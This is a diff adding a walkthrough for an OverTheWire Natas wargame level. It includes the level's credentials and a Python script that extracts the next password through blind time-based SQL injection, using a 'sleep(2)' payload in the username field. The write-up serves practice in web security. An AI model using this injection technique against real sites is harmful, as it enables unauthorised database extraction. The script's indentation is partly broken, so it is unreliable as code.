@@ -817,4 +817,74 @@ Step 6: It is slow process, That's why we need to have more patience to get the 
 +  Password : EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
 + Domain : http://natas17.natas.labs.overthewire.org
 ## Explination
+Step 1:  Go to Firefox Browser, Then Connect to natas17.natas.labs.overthewire.org, Then login with username and password
 
+Step 2: You will see the page like this
+
+![image](./images-1/image-17.png)
+
+Step 3: Lets check the natas17 existency or not
+
+![image](./images-1/image-17-1.png)
+
+Step 4: We can't see the existency of natas17
+
+![image](./images-1/image-17-2.png)
+
+Step 5: We can not move forward with simple blind sql injection. Because it is not showing the exixtency of  natas17
+
+Step 6: Then we will see the source code
+
+![image](./images-1/image-17-3.png)
+
+Step 7: Then we will use Blind time based sql injection  to specific amount of time to get password, By using of Bruteforce attack.
+
+Step 8:  Then write a code like this, In nano editor, Then save the file, Then Run the file by using python filename. Whole process in kali Linux. Because of it has librabraries, we can't Run it online platform.
+
+
+
+    import requests 
+    import re
+    from time import *
+
+    characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+
+    username = 'natas17'
+    password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
+
+    url = 'http://natas17.natas.labs.overthewire.org'
+
+    session = requests.Session()
+
+    current_password = list()
+
+    while True:
+             for character in characters:
+                   print("Trying with: " + "".join(current_password) + character)
+                   startTime = time()
+                   response = session.post(
+                   url,
+                   data={
+                   "username": 'natas18" and password like binary "' +
+                            "".join(current_password) + character + '%" and sleep(2) #'
+                    },
+                    auth=(username, password)
+                    )
+                     endTime = time()
+                     if endTime - startTime >= 2:
+
+                         current_password.append(character)
+                         break
+
+              if len(current_password) == 32:
+              break
+
+
+
+Step 9: It will fetch one by one like loop, By using of Bruteforce attack, Then you will wait until it will get the password for level-18              
+
+![image](./images-1/image-17-4.png)
+
+Step 10: Finally it will get the password for level-18
+
+![image](./images-1/image-17-5.png)
